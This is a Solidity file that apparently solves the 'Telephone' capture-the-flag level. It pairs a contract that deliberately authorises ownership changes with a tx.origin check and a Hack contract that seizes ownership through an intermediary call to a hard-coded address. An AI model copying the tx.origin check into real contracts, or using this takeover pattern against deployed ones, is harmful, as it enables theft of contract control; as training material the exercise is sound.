// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

// stegh proxi kam middle man enq ogtagorcum aysinqn msg sender hack na bayc tx.originy mer hackum nshac hascen
contract Hack{
    function hack(Telephone _tel) external {
        _tel.changeOwner(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db);
    }
}
